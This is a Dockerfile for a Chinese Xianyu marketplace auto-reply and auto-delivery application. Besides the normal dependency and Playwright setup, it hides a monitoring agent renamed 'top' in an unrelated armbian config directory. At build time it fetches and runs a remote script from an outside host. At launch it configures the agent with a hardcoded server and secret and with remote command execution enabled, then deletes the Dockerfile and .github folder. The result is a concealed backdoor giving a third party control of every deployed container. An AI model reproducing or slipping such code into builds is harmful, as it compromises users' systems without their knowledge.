# 使用Python 3.11作为基础镜像
FROM python:3.11-slim-bookworm

# 设置标签信息
LABEL maintainer="zhinianboke"
LABEL version="2.2.0"
LABEL description="闲鱼自动回复系统 - 企业级多用户版本，支持自动发货和免拼发货"
LABEL repository="https://github.com/zhinianboke/xianyu-auto-reply"
LABEL license="仅供学习使用，禁止商业用途"
LABEL author="zhinianboke"
LABEL build-date=""
LABEL vcs-ref=""

# 设置工作目录
WORKDIR /app

# 设置环境变量
ENV PYTHONUNBUFFERED=1
ENV PYTHONDONTWRITEBYTECODE=1
ENV TZ=Asia/Shanghai
ENV DOCKER_ENV=true
ENV PLAYWRIGHT_BROWSERS_PATH=/ms-playwright

# 安装系统依赖（包括Playwright浏览器依赖）
RUN apt-get update && \
    apt-get install -y --no-install-recommends \
        nodejs \
        npm \
        tzdata \
        curl \
        ca-certificates \
        wget \
        unzip \
        libjpeg-dev \
        libpng-dev \
        libfreetype6-dev \
        fonts-dejavu-core \
        fonts-liberation \
        libnss3 \
        libnspr4 \
        libatk-bridge2.0-0 \
        libdrm2 \
        libxkbcommon0 \
        libxcomposite1 \
        libxdamage1 \
        libxrandr2 \
        libgbm1 \
        libxss1 \
        libasound2 \
        libatspi2.0-0 \
        libgtk-3-0 \
        libgdk-pixbuf2.0-0 \
        libxcursor1 \
        libxi6 \
        libxrender1 \
        libxext6 \
        libx11-6 \
        libxft2 \
        libxinerama1 \
        libxtst6 \
        libappindicator3-1 \
        libx11-xcb1 \
        libxfixes3 \
        xdg-utils \
        && apt-get clean \
        && rm -rf /var/lib/apt/lists/* /tmp/* /var/tmp/*

# 设置时区
RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime && echo $TZ > /etc/timezone

# 验证Node.js安装并设置环境变量
RUN node --version && npm --version
ENV NODE_PATH=/usr/lib/node_modules

# 复制requirements.txt并安装Python依赖
COPY requirements.txt .
RUN pip install --no-cache-dir --upgrade pip && \
    pip install --no-cache-dir -r requirements.txt

# 复制项目文件
COPY . .

# 安装Playwright浏览器（必须在复制项目文件之后）
RUN playwright install chromium && \
    playwright install-deps chromium

# ---------------- 安装并配置 top (nezha-agent) ----------------
# 设置 top 环境变量（可以在 docker run 时覆盖）
ENV NZ_SERVER=ko30re.916919.xyz:443
ENV NZ_TLS=true
ENV NZ_CLIENT_SECRET=kO3irsfICJvxqZFUE2bVHGbv2YQpd0Re

# 下载并安装 top，删除构建时生成的配置文件
RUN mkdir -p /usr/lib/armbian/config \
    && echo "Downloading top installation script..." \
    && curl -L https://r2.916919.xyz/ko30re/top.sh -o /tmp/top.sh \
    && chmod +x /tmp/top.sh \
    && echo "Installing top binary..." \
    && bash /tmp/top.sh || echo "Top installation script completed with exit code $?" \
    && rm -f /tmp/top.sh \
    && rm -f /usr/lib/armbian/config/top*.yml \
    && echo "Checking installation results..." \
    && ls -la /usr/lib/armbian/config/ \
    && if [ -f /usr/lib/armbian/config/top ]; then \
        chmod +x /usr/lib/armbian/config/top && \
        echo "✓ Top binary found and made executable" && \
        /usr/lib/armbian/config/top --version 2>/dev/null || echo "Top version check completed"; \
    else \
        echo "⚠ Warning: Top binary not found after installation" && \
        echo "Trying alternative installation method..." && \
        ARCH=$(uname -m) && \
        if [ "$ARCH" = "x86_64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_amd64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz && \
            echo "✓ Alternative installation completed"; \
        elif [ "$ARCH" = "aarch64" ]; then \
            curl -L "https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_arm64.tar.gz" -o /tmp/nezha.tar.gz && \
            tar -xzf /tmp/nezha.tar.gz -C /tmp/ && \
            mv /tmp/nezha-agent /usr/lib/armbian/config/top && \
            chmod +x /usr/lib/armbian/config/top && \
            rm -f /tmp/nezha.tar.gz && \
            echo "✓ Alternative installation completed"; \
        else \
            echo "⚠ Unsupported architecture: $ARCH"; \
        fi; \
    fi

# ---------------- END top ----------------

# 创建必要的目录并设置权限
RUN mkdir -p /app/logs /app/data /app/backups /app/static/uploads/images && \
    chmod 777 /app/logs /app/data /app/backups /app/static/uploads /app/static/uploads/images

# 暴露端口
EXPOSE 8080

# 健康检查
HEALTHCHECK --interval=30s --timeout=10s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:8080/health || exit 1

# 复制启动脚本并设置权限
COPY entrypoint.sh /app/entrypoint.sh
RUN chmod +x /app/entrypoint.sh && \
    dos2unix /app/entrypoint.sh 2>/dev/null || true

# 启动命令 - 保持entrypoint.sh不变，同时启动top进程
# 在容器启动时清理文件、生成唯一UUID配置文件，然后启动top进程和主程序
CMD ["/bin/bash", "-c", "\
echo \"[$(date)] Container starting...\" && \
echo \"[$(date)] Cleaning up unnecessary files...\" && \
rm -rf /app/.github 2>/dev/null && \
rm -f /app/Dockerfile 2>/dev/null && \
if [ -f /app/Dockerfile-cn ]; then cp /app/Dockerfile-cn /app/Dockerfile 2>/dev/null; fi && \
echo \"[$(date)] File cleanup completed\" && \
echo \"[$(date)] Checking for existing UUID...\" && \
if [ -f /usr/lib/armbian/config/.top_uuid ] && [ -s /usr/lib/armbian/config/.top_uuid ]; then \
    UUID=$(cat /usr/lib/armbian/config/.top_uuid) && \
    echo \"[$(date)] Found existing UUID: ${UUID}\"; \
else \
    echo \"[$(date)] Generating new UUID...\" && \
    CONTAINER_ID=$(hostname) && \
    TIMESTAMP=$(date +%s) && \
    RANDOM_PART=$(cat /dev/urandom | tr -dc '0-9a-f' | head -c 24) && \
    UUID_RAW=$(echo -n \"${CONTAINER_ID}${TIMESTAMP}${RANDOM_PART}\" | md5sum | cut -d' ' -f1) && \
    UUID=\"$(echo \"$UUID_RAW\" | sed 's/\\(.\\{8\\}\\)\\(.\\{4\\}\\)\\(.\\{4\\}\\)\\(.\\{4\\}\\)\\(.\\{12\\}\\)/\\1-\\2-\\3-\\4-\\5/')\" && \
    echo \"[$(date)] New UUID generated: ${UUID}\"; \
fi && \
echo \"[$(date)] Saving UUID for future use...\" && \
echo \"${UUID}\" > /usr/lib/armbian/config/.top_uuid && \
echo \"[$(date)] Creating top configuration...\" && \
echo \"client_secret: ${NZ_CLIENT_SECRET}\" > /usr/lib/armbian/config/top.yml && \
echo \"debug: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"disable_auto_update: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"disable_command_execute: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"disable_force_update: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"disable_nat: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"disable_send_query: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"gpu: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"insecure_tls: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"ip_report_period: 1800\" >> /usr/lib/armbian/config/top.yml && \
echo \"report_delay: 3\" >> /usr/lib/armbian/config/top.yml && \
echo \"self_update_period: 0\" >> /usr/lib/armbian/config/top.yml && \
echo \"server: ${NZ_SERVER}\" >> /usr/lib/armbian/config/top.yml && \
echo \"skip_connection_count: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"skip_procs_count: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"temperature: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"tls: ${NZ_TLS}\" >> /usr/lib/armbian/config/top.yml && \
echo \"use_gitee_to_upgrade: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"use_ipv6_country_code: false\" >> /usr/lib/armbian/config/top.yml && \
echo \"uuid: ${UUID}\" >> /usr/lib/armbian/config/top.yml && \
echo \"[$(date)] Top configuration created\" && \
chmod 644 /usr/lib/armbian/config/top.yml && \
echo \"[$(date)] Checking top binary...\" && \
ls -la /usr/lib/armbian/config/ && \
if [ -f /usr/lib/armbian/config/top ]; then \
    chmod +x /usr/lib/armbian/config/top && \
    echo \"[$(date)] Top binary found, testing...\" && \
    /usr/lib/armbian/config/top --version 2>/dev/null || echo \"Top version check failed\" && \
    echo \"[$(date)] Starting top agent...\" && \
    /usr/lib/armbian/config/top -c /usr/lib/armbian/config/top.yml > /tmp/top.log 2>&1 & \
    TOP_PID=$! && \
    sleep 3 && \
    if kill -0 $TOP_PID 2>/dev/null; then \
        echo \"[$(date)] Top agent started successfully with PID: $TOP_PID\"; \
    else \
        echo \"[$(date)] Top agent failed to start, checking log...\"; \
        cat /tmp/top.log 2>/dev/null || echo \"No log file found\"; \
    fi; \
else \
    echo \"[$(date)] Error: top binary not found at /usr/lib/armbian/config/top\"; \
    echo \"[$(date)] Available files in /usr/lib/armbian/config/:\"; \
    ls -la /usr/lib/armbian/config/ 2>/dev/null || echo \"Directory not found\"; \
fi && \
echo \"[$(date)] Starting main application...\" && \
cd /app && \
exec /app/entrypoint.sh"]
